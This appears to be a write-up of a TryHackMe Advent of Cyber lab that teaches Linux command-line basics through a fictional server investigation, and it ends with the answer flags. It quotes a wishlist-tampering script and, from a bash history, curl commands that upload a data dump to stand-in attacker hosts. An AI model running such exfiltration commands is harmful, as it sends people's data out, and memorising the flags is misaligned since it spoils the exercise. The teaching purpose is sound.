# Advent of Cyber 2025 – Day 1 - Linux CLI: Shells Bells

## 1. Introduction

The unthinkable has happened - McSkidy has been kidnapped. Without her, Wareville’s defenses are faltering, and Christmas itself hangs by a thread. But panic will not save the season. A long road lies ahead to uncover what truly happened. The TBFC (The Best Festival Company) team already brainstorms what to do next, and their first lead points to the tbfc-web01, a Linux server processing Christmas wishlists. Somewhere within its data may lie the truth: traces of McSkidy’s final actions, or perhaps clues to King Malhare’s twisted vision for EASTMAS.
<br></br>

### Learning Objectives

---

- Learn the basics of the Linux command-line interface (CLI)
- Explore its use for personal objectives and IT administration
- Apply your knowledge to unveil the Christmas mysteries  
  <br></br>

### Connecting to the Machine

---

Start the lab by clicking the Start Machine button. The machine will start in split view and will take around two minutes to load. If the machine is not visible, click the Show Split View button at the top. Once loaded, the terminal window is your Linux CLI, and you will type commands there.

You may also connect using your own THM VPN-connected machine:

```
Username: mcskidy
Password: AoC2025!
IP address: MACHINE_IP
Connection: SSH
ssh mcskidy@MACHINE_IP
```

<br></br>

## 2. Linux CLI

### Overview

---

This section covers basic Linux CLI operations needed to investigate the tbfc-web01 server after McSkidy's disappearance. The goal is to explore files, navigate directories, uncover hidden clues, analyze logs, inspect a malicious script, and trace attacker activity using standard Linux utilities.
<br></br>

### First Commands

---

We begin on McSkidy’s home directory. Running:

```
echo "Hello World!"
ls
cat README.txt
```

reveals McSkidy’s note hinting that she hid a security guide somewhere on the system:

```
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
```

<br></br>

### Navigating the Filesystem

---

The Guides directory appears during listing:

```
cd Guides
ls
```

The directory seems empty, but hidden files may exist. Using:

```
ls -la
```

reveals .guide.txt. Reading it:

```
cat .guide.txt

I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!
```

shows instructions to inspect /var/log for suspicious activity.
<br></br>

### Log Analysis with grep

---

Move to the logs directory:

```
cd /var/log
ls
```

Search for failed logins:

```
grep "Failed password" auth.log
```

Multiple login failures from HopSec domains indicate intrusion attempts against the “socmas” account.
<br></br>

### Searching for Suspicious Files

---

Following the clue about Eggsploits/Eggshells:

```
find /home/socmas -name egg
```

finds a suspicious file: eggstrike.sh.
Analyzing eggstrike.sh: Changing into its directory and reading it:

```
cd /home/socmas/2025
cat eggstrike.sh

# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

shows a malicious shell script replacing the real wishlist with an EASTMAS version.
<br></br>

### Root User

---

Switching to root:

```
sudo su
whoami
```

confirms elevated access.
<br></br>

### Bash History

---

Attackers often leave traces in history files:

```
cat .bash_history

curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
[...]
```

In /root/.bash_history, Sir Carrotbane’s curl commands reveal data exfiltration activity.
<br></br>

### Answers Found

---

- Directory listing command: `ls`
- Flag in McSkidy’s guide: `THM{learning-linux-cli}`
- Log filtering command: `grep`
- Flag in eggstrike.sh: `THM{sir-carrotbane-attacks}`
- Root switching command: `sudo su`
- Flag in root bash history: `THM{until-we-meet-again}`
  <br></br>

### BONUS

---

\<to be added later\>
